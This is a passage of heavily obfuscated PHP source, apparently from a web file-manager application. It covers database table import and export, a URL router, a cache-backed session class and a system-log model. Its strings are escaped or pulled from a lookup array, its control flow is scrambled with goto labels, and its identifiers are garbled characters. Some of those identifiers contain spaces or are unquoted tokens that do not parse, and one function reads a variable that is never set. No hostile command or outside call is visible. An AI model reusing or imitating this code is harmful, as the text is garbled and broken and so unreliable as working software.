$FĞØÁ°ß¦Æ->execute("\x73\150\157\x77\x20\144\141\x74\x61\142\x61\163\x65\x73\40\x6c\151\153\145\40\x27{$eÙÚ§îĞÏÂ}\47"); goto BÃù¸Ö´¼É; BÃù¸Ö´¼É: if (!$cùªç¹æ–“) { $FĞØÁ°ß¦Æ->execute("\x63\x72\x65\141\164\145\x20\144\x61\164\141\x62\x61\x73\145\x20\140{$eÙÚ§îĞÏÂ}\140"); } $C¿ÖØØìøŒ[$D¤°î¸åË¢[231]] = $eÙÚ§îĞÏÂ; if ($C¿ÖØØìøŒ[$D¤°î¸åË¢[706]] == $D¤°î¸åË¢[707]) { $C¿ÖØØìøŒ[$D¤°î¸åË¢[709]] .= $D¤°î¸åË¢[1277] . $eÙÚ§îĞÏÂ; } goto F¦‹×¯ÜèÚ; f¬çÌ«ñø±: } public function createTable($d¤˜·²ÑÅÈ, $aˆÔÖç¸È¢ = null) { $E¡™…ãÀ =& $_SERVER[‘®…¢À]; if (!@file_exists($d¤˜·²ÑÅÈ)) { show_json(LNG($E¡™…ãÀ[1278]), !1); } $eÅ×äµ×‹« = sqlSplit(file_get_contents($d¤˜·²ÑÅÈ)); foreach ($eÅ×äµ×‹« as $AÅ¾¶Ê›Šç) { if ($aˆÔÖç¸È¢) { $aå Ä½ ¶‚ = stripos($AÅ¾¶Ê›Šç, $E¡™…ãÀ[1279]) === 0; if ($aå Ä½ ¶‚) { $aˆÔÖç¸È¢->task[$E¡™…ãÀ[1280]] += 1; } } $this->model()->db()->execute($AÅ¾¶Ê›Šç); if ($aˆÔÖç¸È¢ && $aå Ä½ ¶‚) { $D‚Šø¢½Œ = $E¡™…ãÀ[1281]; preg_match($D‚Šø¢½Œ, $AÅ¾¶Ê›Šç, $F½°¤Éœéâ); $aˆÔÖç¸È¢->task[$E¡™…ãÀ[1282]] = trim($BÁî˜øëÎÁ[0], $E¡™…ãÀ[804]); $aˆÔÖç¸È¢->update(1); } } $this->taskToCache($aˆÔÖç¸È¢); } public function insertTable($fõ±è‘é¢Û, $fß½Ò±¾¿ = null) { $Fõ“Êˆ¿† =& $_SERVER[‘®…¢À]; foreach ($fõ±è‘é¢Û as $e»÷•¬‰¹è) { $c–Ùİ›âÖ… = basename($e»÷•¬‰¹è); $c–Ùİ›âÖ… = substr($c–Ùİ›âÖ…, 0, strrpos($c–Ùİ›âÖ…, $Fõ“Êˆ¿†[94])); if ($fß½Ò±¾¿) { $fß½Ò±¾¿->task[$Fõ“Êˆ¿†[1282]] = $c–Ùİ›âÖ…; } if (get_filesize($e»÷•¬‰¹è) == 0) { continue; } $E¯‘åÆŠ‰œ = $this->sqlToDb($e»÷•¬‰¹è, $fß½Ò±¾¿); if (!$E¯‘åÆŠ‰œ) { show_json(LNG($Fõ“Êˆ¿†[1283]) . "\133{$c–Ùİ›âÖ…}\135", !1); } } $this->taskToCache($fß½Ò±¾¿); } public function sqlFromDb($bíõæ³»„ò, $Aã”äì…ìí, $B„å¤Õ„Éö = null) { goto cï´×ƒ§¼¹; f¿ŠŞ‚èÎ¢: $F— ˜µß = fopen($Aã”äì…ìí, $e¼™í¹ñ›Ñ[693]); $d¯…Øö†Úç = $BîÔ˜óø¾Ï->getPk(); $fß‰¢×¥ª = $BîÔ˜óø¾Ï->getDbFields(); goto e¸æ¦•‰°Ù; F¨©óøÆŒ¨: $f±‰ËÕŞßç = 0; $D˜óÁ¸­…‡ = 1; $bùªÊÏéßí = 500; goto f¿ŠŞ‚èÎ¢; e¸æ¦•‰°Ù: do { $a¦«Èâ´ê¬ = $BîÔ˜óø¾Ï->field($fß‰¢×¥ª)->order($d¯…Øö†Úç . $e¼™í¹ñ›Ñ[694])->selectPage($bùªÊÏéßí, $D˜óÁ¸­…‡); $Bù±¬ŠäÃÃ = !empty($a¦«Èâ´ê¬[$e¼™í¹ñ›Ñ[350]]) ? $a¦«Èâ´ê¬[$e¼™í¹ñ›Ñ[350]] : array(); if (!($fô¹î‹Ñ¢ = count($Bù±¬ŠäÃÃ))) { break; } if ($B„å¤Õ„Éö) { $B„å¤Õ„Éö->task[$e¼™í¹ñ›Ñ[1280]] += $fô¹î‹Ñ¢; } $bôÂœÊìâ„ = array(); foreach ($Bù±¬ŠäÃÃ as $fáÂò÷Èã) { $bôÂœÊìâ„[] = $e¼™í¹ñ›Ñ[697] . $this->sqlEncode($fáÂò÷Èã) . $e¼™í¹ñ›Ñ[698]; } $Fé¾õÑÎİŞ = "\x49\116\123\x45\x52\x54\40\111\x4e\124\117\x20\140{$bíõæ³»„ò}\x60\40\50\x60" . implode($e¼™í¹ñ›Ñ[699], $fß‰¢×¥ª) . $e¼™í¹ñ›Ñ[700]; fwrite($F— ˜µß, $Fé¾õÑÎİŞ . implode($e¼™í¹ñ›Ñ[701], $bôÂœÊìâ„) . $e¼™í¹ñ›Ñ[68] . PHP_EOL); $D˜óÁ¸­…‡++; $f±‰ËÕŞßç += $fô¹î‹Ñ¢; if ($B„å¤Õ„Éö) { $B„å¤Õ„Éö->update($fô¹î‹Ñ¢); } } while ($fô¹î‹Ñ¢ == $bùªÊÏéßí); fclose($F— ˜µß); return $f±‰ËÕŞßç; goto Aàíä¿ˆ‚›; cï´×ƒ§¼¹: $e¼™í¹ñ›Ñ =& $_SERVER[‘®…¢À]; if ($B„å¤Õ„Éö) { $B„å¤Õ„Éö->task[$e¼™í¹ñ›Ñ[1282]] = $bíõæ³»„ò; } $BîÔ˜óø¾Ï = $this->model($bíõæ³»„ò); goto F¨©óøÆŒ¨; Aàíä¿ˆ‚›: } public function sqlToDb($cÏğ‰ìœ¿ô, $BÙƒÇ¢Ãö¨ = null) { goto aÔ»ƒøÚ¦; a»òÖ„²³‚: $A»Ã‡ÁÙ¼¡ = 500 + 1; while (!feof($CÚ¯„“ƒïã)) { if ($BÙƒÇ¢Ãö¨ && $Cö…Ó­® != 0) { $BÙƒÇ¢Ãö¨->task[$e« Œ‡†À[1280]] += 1; } $Cö…Ó­®++; $Då§Í•ì‡ = trim(fgets($CÚ¯„“ƒïã)); $B ˜äŒÀ°« .= $e« Œ‡†À[50] . $this->sqlDecode($Då§Í•ì‡, $this->type); if ($Cö…Ó­® == $A»Ã‡ÁÙ¼¡) { $B ˜äŒÀ°« = rtrim($B ˜äŒÀ°«, $e« Œ‡†À[68]); if (!$eÑå¨×¸Í->execute($B ˜äŒÀ°«)) { return !1; } if ($BÙƒÇ¢Ãö¨) { $BÙƒÇ¢Ãö¨->update($Cö…Ó­® - 1); } $B ˜äŒÀ°« = $e« Œ‡†À[33]; $Cö…Ó­® = 0; } } fclose($CÚ¯„“ƒïã); goto BÅ¨­„¸¯; BÅ¨­„¸¯: if ($B ˜äŒÀ°«) { $B ˜äŒÀ°« = rtrim($B ˜äŒÀ°«, $e« Œ‡†À[68]); if (!$eÑå¨×¸Í->execute($B ˜äŒÀ°«)) { return !1; } if ($BÙƒÇ¢Ãö¨) { $BÙƒÇ¢Ãö¨->update($Cö…Ó­® - 1); } } return !0; goto D¦êÂ‚Ìó¼; aÔ»ƒøÚ¦: $e« Œ‡†À =& $_SERVER[‘®…¢À]; $eÑå¨×¸Í = $this->model()->db(); $CÚ¯„“ƒïã = @fopen($cÏğ‰ìœ¿ô, $e« Œ‡†À[1284]); goto fº¤Êğ‹ê; fº¤Êğ‹ê: if (!$CÚ¯„“ƒïã) { return !1; } $Cö…Ó­® = 0; $B ˜äŒÀ°« = $e« Œ‡†À[33]; goto a»òÖ„²³‚; D¦êÂ‚Ìó¼: } public function dropTable($C†ÃèˆÄ÷„ = null) { $eËŞË„ŒĞ = $this->model()->db(); $C¯ºØ„´ ù = $C†ÃèˆÄ÷„ ? array($C†ÃèˆÄ÷„) : $eËŞË„ŒĞ->getTables(); if (!$C¯ºØ„´ ù) { return; } foreach ($C¯ºØ„´ ù as $C†ÃèˆÄ÷„) { $eËŞË„ŒĞ->execute("\x64\162\x6f\160\x20\164\x61\142\x6c\145\40\x69\146\x20\x65\170\x69\x73\164\163\x20\x60{$C†ÃèˆÄ÷„}\140"); } } private function taskToCache($F¦ª¯÷ø¿½ = null) { $cçš÷†¨‹² =& $_SERVER[‘®…¢À]; if (!$F¦ª¯÷ø¿½) { return; } $EÑ…‰À¸Š‹ = array($cçš÷†¨‹²[1282] => $F¦ª¯÷ø¿½->task[$cçš÷†¨‹²[1282]], $cçš÷†¨‹²[1280] => $F¦ª¯÷ø¿½->task[$cçš÷†¨‹²[1280]], $cçš÷†¨‹²[1285] => $F¦ª¯÷ø¿½->task[$cçš÷†¨‹²[1285]]); if ($EÑ…‰À¸Š‹[$cçš÷†¨‹²[1280]] == $EÑ…‰À¸Š‹[$cçš÷†¨‹²[1285]]) { $EÑ…‰À¸Š‹[$cçš÷†¨‹²[669]] = 1; } Cache::set($cçš÷†¨‹²[1286] . $F¦ª¯÷ø¿½->task[$cçš÷†¨‹²[363]], $EÑ…‰À¸Š‹); $F¦ª¯÷ø¿½->end(); } private function sqlEncode($A©Å‚Ë…™à) { $C™§Ğæè‹ =& $_SERVER[‘®…¢À]; $d¢¤¨ç¹¶ = array(); foreach ($A©Å‚Ë…™à as $bæ“â’Æ—) { if (is_array($bæ“â’Æ—)) { $bæ“â’Æ— = json_encode_force($bæ“â’Æ—); } $bæ“â’Æ— = addslashes($bæ“â’Æ—); $bæ“â’Æ— = str_replace(array($C™§Ğæè‹[702], $C™§Ğæè‹[214]), array($C™§Ğæè‹[703], $C™§Ğæè‹[704]), $bæ“â’Æ—); $d¢¤¨ç¹¶[] = str_replace($C™§Ğæè‹[55], $C™§Ğæè‹[1287], $bæ“â’Æ—); } return $C™§Ğæè‹[55] . implode($C™§Ğæè‹[705], $d¢¤¨ç¹¶) . $C™§Ğæè‹[55]; } private function sqlDecode($E‘µø¡ï, $a¥¦ß÷ˆæš) { $DÜĞÃäƒå =& $_SERVER[‘®…¢À]; $E‘µø¡ï = str_replace(array($DÜĞÃäƒå[703], $DÜĞÃäƒå[704]), array($DÜĞÃäƒå[702], $DÜĞÃäƒå[214]), $E‘µø¡ï); if ($a¥¦ß÷ˆæš == $DÜĞÃäƒå[9]) { $E‘µø¡ï = stripslashes($E‘µø¡ï); } return $E‘µø¡ï; } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\133\x5e\57\x5d\53", "\72\x6e\165\x6d" => "\133\x30\x2d\x39\x5d\x2b", "\72\141\154\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($F¯Œòš§Ï¨, $d‘äíê³ğ‰) { $E§¿Šª¡Ÿ =& $_SERVER[‘®…¢À]; if ($F¯Œòš§Ï¨ == $E§¿Šª¡Ÿ[1288]) { $aæçÇ¹–ÎÍ = array_map($E§¿Šª¡Ÿ[1289], $d‘äíê³ğ‰[0]); $FÒç‚™„Ù– = strpos($d‘äíê³ğ‰[1], $E§¿Šª¡Ÿ[8]) === 0 ? $d‘äíê³ğ‰[1] : $E§¿Šª¡Ÿ[8] . $d‘äíê³ğ‰[1]; $a‚—²ÙÎÓ± = $d‘äíê³ğ‰[2]; } else { $aæçÇ¹–ÎÍ = null; $FÒç‚™„Ù– = strpos($d‘äíê³ğ‰[0], $E§¿Šª¡Ÿ[8]) === 0 ? $d‘äíê³ğ‰[0] : $E§¿Šª¡Ÿ[8] . $d‘äíê³ğ‰[0]; $a‚—²ÙÎÓ± = $d‘äíê³ğ‰[1]; } array_push(self::$maps, $aæçÇ¹–ÎÍ); array_push(self::$routes, $FÒç‚™„Ù–); array_push(self::$methods, strtoupper($F¯Œòš§Ï¨)); array_push(self::$callbacks, $a‚—²ÙÎÓ±); } public static function error($a»œğ‡â¯Š) { self::$errorCallback = $a»œğ‡â¯Š; } public static function haltOnMatch($aº—šöÔìÚ = true) { self::$halts = $aº—šöÔìÚ; } public static function dispatch() { goto Aù÷Ù¦Ğ´; f‡„àóÁÛ: self::$routes = preg_replace($b­¹²ïÓÃ£[1031], $b­¹²ïÓÃ£[8], self::$routes); if (in_array($a„Å°Š´¿, self::$routes)) { $A‹®ìĞ°‰å = array_keys(self::$routes, $a„Å°Š´¿); foreach ($A‹®ìĞ°‰å as $cô–Â‘„ïÖ) { if (self::$methods[$cô–Â‘„ïÖ] == $e¼‹Ñ¯‡©Æ || self::$methods[$cô–Â‘„ïÖ] == $b­¹²ïÓÃ£[1291] || in_array($e¼‹Ñ¯‡©Æ, self::$maps[$cô–Â‘„ïÖ])) { $bº›ôÇÌ‹ = !0; if (!is_object(self::$callbacks[$cô–Â‘„ïÖ])) { $AÜ®‘ÚÓî¹ = explode($b­¹²ïÓÃ£[8], self::$callbacks[$cô–Â‘„ïÖ]); $f÷‡¯ßÍô = end($AÜ®‘ÚÓî¹); $eŠÃ³ë©†´ = explode($b­¹²ïÓÃ£[1292], $f÷‡¯ßÍô); $B»Š±ƒä˜œ = new $eŠÃ³ë©†´[0](); $B»Š±ƒä˜œ->{$eŠÃ³ë©†´[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$cô–Â‘„ïÖ]); if (self::$halts) { return; } } } } } else { $A–…¨Û¤í = 0; foreach (self::$routes as $cô–Â‘„ïÖ) { if (strpos($cô–Â‘„ïÖ, $b­¹²ïÓÃ£[4]) !== !1) { $cô–Â‘„ïÖ = str_replace($E«ÙÜÈÆÍ, $B£å¯ñ£…ª, $cô–Â‘„ïÖ); } if (preg_match($b­¹²ïÓÃ£[1293] . $cô–Â‘„ïÖ . $b­¹²ïÓÃ£[1294], $a„Å°Š´¿, $F¤‡œˆ¾)) { if (self::$methods[$A–…¨Û¤í] == $e¼‹Ñ¯‡©Æ || self::$methods[$A–…¨Û¤í] == $b­¹²ïÓÃ£[1291] || !empty(self::$maps[$A–…¨Û¤í]) && in_array($e¼‹Ñ¯‡©Æ, self::$maps[$A–…¨Û¤í])) { $bº›ôÇÌ‹ = !0; array_shift($F¤‡œˆ¾); if (!is_object(self::$callbacks[$A–…¨Û¤í])) { $AÜ®‘ÚÓî¹ = explode($b­¹²ïÓÃ£[8], self::$callbacks[$A–…¨Û¤í]); $f÷‡¯ßÍô = end($AÜ®‘ÚÓî¹); $eŠÃ³ë©†´ = explode($b­¹²ïÓÃ£[1292], $f÷‡¯ßÍô); $B»Š±ƒä˜œ = new $eŠÃ³ë©†´[0](); if (!method_exists($B»Š±ƒä˜œ, $eŠÃ³ë©†´[1])) { echo $b­¹²ïÓÃ£[1295]; } else { call_user_func_array(array($B»Š±ƒä˜œ, $eŠÃ³ë©†´[1]), $F¤‡œˆ¾); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$A–…¨Û¤í], $F¤‡œˆ¾); if (self::$halts) { return; } } } } $A–…¨Û¤í++; } } if ($bº›ôÇÌ‹ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $c¸¶Ùéà =& $_SERVER[‘®…¢À]; header($_SERVER[$c¸¶Ùéà[1296]] . $c¸¶Ùéà[1297]); echo $c¸¶Ùéà[1298]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$b­¹²ïÓÃ£[1290]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto AªŒˆ™Åè…; bÓ³ÅƒËùÚ: $E«ÙÜÈÆÍ = array_keys(static::$patterns); $B£å¯ñ£…ª = array_values(static::$patterns); $bº›ôÇÌ‹ = !1; goto f‡„àóÁÛ; Aù÷Ù¦Ğ´: $b­¹²ïÓÃ£ =& $_SERVER[‘®…¢À]; $a„Å°Š´¿ = parse_url($_SERVER[$b­¹²ïÓÃ£[1290]], PHP_URL_PATH); $e¼‹Ñ¯‡©Æ = $_SERVER[$b­¹²ïÓÃ£[151]]; goto bÓ³ÅƒËùÚ; AªŒˆ™Åè…: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto Fç¤¾†Ã‘; A¥á°ËÒ§: Cookie::setSafe(SESSION_ID, self::$sessionSign, self::$sessionTime); $dÒµ·¢½Å‚ = $Ašƒùƒêä[$BÉ•ÀÁè¢[1300]]; $cà‰Ÿ¾ç‚µ = $Ašƒùƒêä[$dÒµ·¢½Å‚]; goto C‡­äò×å•; eâŠ•¦åö»: $cà‚‰×Íø = new self(); return $cà‚‰×Íø; goto EÅÅÏ°Áƒô; Fç¤¾†Ã‘: $BÉ•ÀÁè¢ =& $_SERVER[‘®…¢À]; static $cà‚‰×Íø = false; if ($cà‚‰×Íø) { return $cà‚‰×Íø; } goto Cµ–¯Ó­£„; C‡­äò×å•: $e÷ğŞ¨¡Ç = $Ašƒùƒêä[$BÉ•ÀÁè¢[737]]; switch ($dÒµ·¢½Å‚) { case $BÉ•ÀÁè¢[17]: self::$handle = Model($BÉ•ÀÁè¢[738]); break; case $BÉ•ÀÁè¢[739]: self::$handle = new CacheRedis($cà‰Ÿ¾ç‚µ, $e÷ğŞ¨¡Ç); break; case $BÉ•ÀÁè¢[740]: self::$handle = new CacheMemcached($cà‰Ÿ¾ç‚µ, $e÷ğŞ¨¡Ç); break; case $BÉ•ÀÁè¢[164]: $cà‰Ÿ¾ç‚µ[$BÉ•ÀÁè¢[76]] = $cà‰Ÿ¾ç‚µ[$BÉ•ÀÁè¢[76]] . $BÉ•ÀÁè¢[1301]; self::$handle = new CacheFile($cà‰Ÿ¾ç‚µ, $e÷ğŞ¨¡Ç); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } goto eâŠ•¦åö»; Cµ–¯Ó­£„: $Ašƒùƒêä = $GLOBALS[$BÉ•ÀÁè¢[6]][$BÉ•ÀÁè¢[334]]; self::$sessionTime = $Ašƒùƒêä[$BÉ•ÀÁè¢[1299]]; if (self::$sessionSign) { } else { if (Cookie::get(SESSION_ID)) { self::$sessionSign = Cookie::get(SESSION_ID); } else { self::$sessionSign = guid(); } } goto A¥á°ËÒ§; EÅÅÏ°Áƒô: } public static function sign($bÓêëàìå¼ = false) { $bÓêëàìå¼ && (self::$sessionSign = $bÓêëàìå¼); self::init(); return self::$sessionSign; } public static function set($b®àˆ½æ¿¤, $FÅ¥¨ì“ï = false) { self::init(); if (is_array($b®àˆ½æ¿¤)) { foreach ($b®àˆ½æ¿¤ as $CŞé‰„Şª¾ => $fÚº§¦ßÕ) { array_set_value(self::$data, $CŞé‰„Şª¾, $fÚº§¦ßÕ); } } else { array_set_value(self::$data, $b®àˆ½æ¿¤, $FÅ¥¨ì“ï); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($F¬Ãïµ¹„ó = false) { self::init(); if (!$F¬Ãïµ¹„ó) { return self::$data; } return array_get_value(self::$data, $F¬Ãïµ¹„ó); } public static function remove($e„—¢ç¦½‘) { self::init(); unset(self::$data[$e„—¢ç¦½‘]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[‘®…¢À][742])) { self::$handle->clearTimeout(); } } } goto D…¶ø™ÀÑ; BßËÅãÂí: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\x65\x6d\x5f\x6c\x6f\x67"; protected $dataAuto = array(array("\x63\x72\145\141\164\x65\x54\x69\x6d\145", "\164\x69\155\x65", "\151\x6e\163\x65\162\164", "\x66\165\156\143\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $D¹Âé˜¹ß =& $_SERVER[‘®…¢À]; return array($D¹Âé˜¹ß[2251] => LNG($D¹Âé˜¹ß[2252]), $D¹Âé˜¹ß[2253] => LNG($D¹Âé˜¹ß[2254]), $D¹Âé˜¹ß[1941] => LNG($D¹Âé˜¹ß[2255]), $D¹Âé˜¹ß[2256] => LNG($D¹Âé˜¹ß[2257]), $D¹Âé˜¹ß[2258] => LNG($D¹Âé˜¹ß[2259]), $D¹Âé˜¹ß[2260] => LNG($D¹Âé˜¹ß[2261]), $D¹Âé˜¹ß[2262] => LNG($D¹Âé˜¹ß[2263]), $D¹Âé˜¹ß[2264] => LNG($D¹Âé˜¹ß[2265]), $D¹Âé˜¹ß[1972] => LNG($D¹Âé˜¹ß[2266]), $D¹Âé˜¹ß[2267] => LNG($D¹Âé˜¹ß[2268]), $D¹Âé˜¹ß[2269] => LNG($D¹Âé˜¹ß[2270]), $D¹Âé˜¹ß[2271] => LNG($D¹Âé˜¹ß[2272]), $D¹Âé˜¹ß[2273] => LNG($D¹Âé˜¹ß[2274]), $D¹Âé˜¹ß[1970] => LNG($D¹Âé˜¹ß[2275]), $D¹Âé˜¹ß[1975] => LNG($D¹Âé˜¹ß[2276]), $D¹Âé˜¹ß[2277] => LNG($D¹Âé˜¹ß[2278]), $D¹Âé˜¹ß[2279] => LNG($D¹Âé˜¹ß[2280]), $D¹Âé˜¹ß[2281] => LNG($D¹Âé˜¹ß[2282]), $D¹Âé˜¹ß[2283] => LNG($D¹Âé˜¹ß[2284]), $D¹Âé˜¹ß[1978] => LNG($D¹Âé˜¹ß[2285]), $D¹Âé˜¹ß[1979] => LNG($D¹Âé˜¹ß[2286]), $D¹Âé˜¹ß[2287] => LNG($D¹Âé˜¹ß[2288]), $D¹Âé˜¹ß[2289] => LNG($D¹Âé˜¹ß[2290]), $D¹Âé˜¹ß[2291] => LNG($D¹Âé˜¹ß[2292]), $D¹Âé˜¹ß[2293] => LNG($D¹Âé˜¹ß[2294]), $D¹Âé˜¹ß[2295] => LNG($D¹Âé˜¹ß[2296]), $D¹Âé˜¹ß[1973] => LNG($D¹Âé˜¹ß[2297]), $D¹Âé˜¹ß[2298] => LNG($D¹Âé˜¹ß[2299]), $D¹Âé˜¹ß[2300] => LNG($D¹Âé˜¹ß[2301]), $D¹Âé˜¹ß[2302] => LNG($D¹Âé˜¹ß[2302]), $D¹Âé˜¹ß[2303] => LNG($D¹Âé˜¹ß[1945]), $D¹Âé˜¹ß[2304] => LNG($D¹Âé˜¹ß[2305]), $D¹Âé˜¹ß[2306] => LNG($D¹Âé˜¹ß[2307]), $D¹Âé˜¹ß[2308] => LNG($D¹Âé˜¹ß[2309]), $D¹Âé˜¹ß[2310] => LNG($D¹Âé˜¹ß[2311]), $D¹Âé˜¹ß[2312] => LNG($D¹Âé˜¹ß[2312]), $D¹Âé˜¹ß[2313] => LNG($D¹Âé˜¹ß[2314]), $D¹Âé˜¹ß[2315] => LNG($D¹Âé˜¹ß[2316]), $D¹Âé˜¹ß[2317] => LNG($D¹Âé˜¹ß[2318]), $D¹Âé˜¹ß[2319] => LNG($D¹Âé˜¹ß[2320]), $D¹Âé˜¹ß[2321] => LNG($D¹Âé˜¹ß[2322]), $D¹Âé˜¹ß[2323] => LNG($D¹Âé˜¹ß[2324])); } private function typeFile() { $E”é´…¿³© =& $_SERVER[‘®…¢À]; $e¹Ğ¼”Ï‡ = array($E”é´…¿³©[1975] => array($E”é´…¿³©[1976]), $E”é´…¿³©[2271] => array($E”é´…¿³©[2325]), $E”é´…¿³©[2273] => array($E”é´…¿³©[2326]), $E”é´…¿³©[1970] => array($E”é´…¿³©[1971]), $E”é´…¿³©[2279] => array(), $E”é´…¿³©[2281] => array(), $E”é´…¿³©[2283] => array(), $E”é´…¿³©[1978] => array($E”é´…¿³©[1980]), $E”é´…¿³©[1979] => array($E”é´…¿³©[1980]), $E”é´…¿³©[2287] => array($E”é´…¿³©[2327]), $E”é´…¿³©[2289] => array($E”é´…¿³©[2327]), $E”é´…¿³©[2291] => array($E”é´…¿³©[2328]), $E”é´…¿³©[2277] => array($E”é´…¿³©[2329]), $E”é´…¿³©[2293] => array($E”é´…¿³©[2330]), $E”é´…¿³©[2295] => array($E”é´…¿³©[2331]), $E”é´…¿³©[1973] => array($E”é´…¿³©[1974])); return $e¹Ğ¼”Ï‡; } private function typeAll() { goto eÒÂÂŸñùÂ; eÒÂÂŸñùÂ: $d‚Ï×´çï¼ =& $_SERVER[‘®…¢À]; $dæ½ÅÓèôÌ = $this->typeList; $bœ‚ĞÄ¯ìç = array_filter($this->typeFile()); goto F¡¨ßŒÎé; F¡¨ßŒÎé: foreach ($bœ‚ĞÄ¯ìç as $b”Œ…¬šÍÇ => $C‰§—ºíğ) { $dæ½ÅÓèôÌ[$C‰§—ºíğ[0]] = $dæ½ÅÓèôÌ[$b”Œ…¬šÍÇ]; } $dæ½ÅÓèôÌ[$d‚Ï×´çï¼[1980]] = LNG($d‚Ï×´çï¼[2332]); $dæ½ÅÓèôÌ[$d‚Ï×´çï¼[2327]] = LNG($d‚Ï×´çï¼[2333]); goto D‡ÖÙÜäÜ™; D‡ÖÙÜäÜ™: return $dæ½ÅÓèôÌ; goto Bõ¢†Ø«Óğ; Bõ¢†Ø«Óğ: } public function addLog($CÄäõà‡Ÿñ, $AÑ†“ó®Ãî = array()) { goto bµÌ§†óÃù; bµÌ§†óÃù: $C’…¢¢Ø‘á =& $_SERVER[‘®…¢À]; if (!isset($this->typeList[$CÄäõà‡Ÿñ])) { return; } $cƒÙ™ÃÃ½ğ = USER_ID ? USER_ID : (isset($AÑ†“ó®Ãî[$C’…¢¢Ø‘á[1337]]) ? $AÑ†“ó®Ãî[$C’…¢¢Ø‘á[1337]] : 0); goto f‘İ±õİª; f‘İ±õİª: $Ağ¡ÄŸ†°« = get_client_ip(); if (!$AÑ†“ó®Ãî || strlen(json_encode($AÑ†“ó®Ãî)) >= 1024) { $AÑ†“ó®Ãî = array($C’…¢¢Ø‘á[2334] => $Ağ¡ÄŸ†°«); } else { if (is_array($AÑ†“ó®Ãî)) { $AÑ†“ó®Ãî[$C’…¢¢Ø‘á[2334]] = $Ağ¡ÄŸ†°«; } else { $AÑ†“ó®Ãî = array($C’…¢¢Ø‘á[992] => $AÑ†“ó®Ãî, $C’…¢¢Ø‘á[2334] => $Ağ¡ÄŸ†°«); } } $AÑ†“ó®Ãî = array($C’…¢¢Ø‘á[1327] => Session::sign(), $C’…¢¢Ø‘á[1328] => $cƒÙ™ÃÃ½ğ, $C’…¢¢Ø‘á[29] => $CÄäõà‡Ÿñ, $C’…¢¢Ø‘á[1330] => json_encode($AÑ†“ó®Ãî)); goto dí’Ä°Öİø; dí’Ä°Öİø: parent::add($AÑ†“ó®Ãî); goto c¾è»³; c¾è»³: } public function remove($Eä”ªá”ò–) { $this->where(array($_SERVER[‘®…¢À][381] => $Eä”ªá”ò–))->delete(); } private function _makeOrder($eñÎ‰õ’‡Å = '') { goto EÇá‹ˆ‚£Á; BË”·¸ÅË‚: return $this->order($eñÎ‰õ’‡Å); goto bÔäÌÚ ‡‰; EÇá‹ˆ‚£Á: $d£×¢ë‡÷´ =& $_SERVER[‘®…¢À]; $fî­Ó›¼Êá = $d£×¢ë‡÷´[184]; $dï±¯¦íˆ™ = array($d£×¢ë‡÷´[397] => $d£×¢ë‡÷´[398], $d£×¢ë‡÷´[399] => $d£×¢ë‡÷´[400]); goto a­ïí³½ºù; a­ïí³½ºù: $E·Â‘£Ïù = Input::get($d£×¢ë‡÷´[403], $d£×¢ë‡÷´[7], $d£×¢ë‡÷´[2136], array($d£×¢ë‡÷´[2077], $d£×¢ë‡÷´[399])); $E·Â‘£Ïù = $dï±¯¦íˆ™[$E·Â‘£Ïù]; $eñÎ‰õ’‡Å = $eñÎ‰õ’‡Å . "{$fî­Ó›¼Êá}\40{$E·Â‘£Ïù}"; goto BË”·¸ÅË‚; bÔäÌÚ ‡‰: } public function get($D˜«½ƒ„ğß = '') { goto F®°ªå·§­; a »‘‰Î‘: $FÄ’Â¤ÍŒß[$CÅéÀàŒ™Œ[350]] = $this->logList($FÄ’Â¤ÍŒß[$CÅéÀàŒ™Œ[350]]); return $FÄ’Â¤ÍŒß; goto C ÈÌ Øëí; F®°ªå·§­: $CÅéÀàŒ™Œ =& $_SERVER[‘®…¢À]; if (!$D˜«½ƒ„ğß) { show_json(array()); } $BÜŞÀƒˆÃ = array(); goto F¯Ü«äÛ·ù; DÏé”è¬„: if (!empty($D˜«½ƒ„ğß[$CÅéÀàŒ™Œ[2334]])) { $BÜŞÀƒˆÃ[$CÅéÀàŒ™Œ[400]] = array($CÅéÀàŒ™Œ[734], "\45{$D˜«½ƒ„ğß[$CÅéÀàŒ™Œ[2334]]}\x25"); } $FÄ’Â¤ÍŒß = $this->_makeOrder()->where($BÜŞÀƒˆÃ)->selectPage(); if (empty($FÄ’Â¤ÍŒß[$CÅéÀàŒ™Œ[350]])) { show_json(array(), !0, $FÄ’Â¤ÍŒß[$CÅéÀàŒ™Œ[347]]); } goto a »‘‰Î‘; F¯Ü«äÛ·ù: if ($D˜«½ƒ„ğß[$CÅéÀàŒ™Œ[1337]]) { $BÜŞÀƒˆÃ[$CÅéÀàŒ™Œ[1337]] = $D˜«½ƒ„ğß[$CÅéÀàŒ™Œ[1337]]; } if (isset($D˜«½ƒ„ğß[$CÅéÀàŒ™Œ[675]])) { $B‘…½…¦ë‘ = $D˜«½ƒ„ğß[$CÅéÀàŒ™Œ[675]]; $F¯šã’Ÿƒİ = isset($D˜«½ƒ„ğß[$CÅéÀàŒ™Œ[676]]) ? $D˜«½ƒ„ğß[$CÅéÀàŒ™Œ[676]] : time(); $BÜŞÀƒˆÃ[$CÅéÀàŒ™Œ[184]] = array($CÅéÀàŒ™Œ[318], array($B‘…½…¦ë‘, $F¯šã’Ÿƒİ)); } if 